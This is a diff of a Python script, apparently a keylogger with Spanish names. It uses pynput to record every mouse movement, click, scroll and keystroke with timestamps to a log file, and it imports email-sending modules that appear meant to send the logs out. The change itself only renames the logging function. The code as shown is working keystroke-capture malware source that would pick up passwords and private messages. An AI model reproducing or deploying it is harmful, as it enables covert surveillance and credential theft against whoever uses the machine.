@@ -1,35 +1,35 @@
 from pynput import mouse,keyboard
 import threading
 from time import time
-from Archivo import escribir
+from Archivo import escribir_accion
 from Control_correo import actualizar_dia, enviar, reiniciar_dia
 from Correo import enviar_correo
 
 def on_move(x, y):
     colocacion = ('{0},{1}'.format(x, y))
-    escribir("Mouse","Moved",time(),colocacion)
+    escribir_accion("Mouse", "Moved", time(), colocacion)
 
 def on_click(x, y, button, pressed):
     accion="{0}".format('Pressed' if pressed else 'Released')
-    escribir("Mouse",accion,time(),str(button))
+    escribir_accion("Mouse", accion, time(), str(button))
 
 def on_scroll(x, y, dx, dy):
     colocacion=('{0}'.format('Down' if dy < 0 else 'Up'))
-    escribir("Mouse","Scrolled",time(),colocacion)
+    escribir_accion("Mouse", "Scrolled", time(), colocacion)
 
 def on_press(key):
     try:
-        escribir("Keyboard", "Pressed", time(), key.char)
+        escribir_accion("Keyboard", "Pressed", time(), key.char)
     except AttributeError:
-        escribir("Keyboard", "Pressed", time(), str(key))
+        escribir_accion("Keyboard", "Pressed", time(), str(key))
     except TypeError:
         pass
 
 def on_release(key):
     try:
-        escribir("Keyboard", "Release", time(), key.char)
+        escribir_accion("Keyboard", "Release", time(), key.char)
     except AttributeError:
-        escribir("Keyboard", "Release", time(), str(key))
+        escribir_accion("Keyboard", "Release", time(), str(key))
     except TypeError:
         pass
 
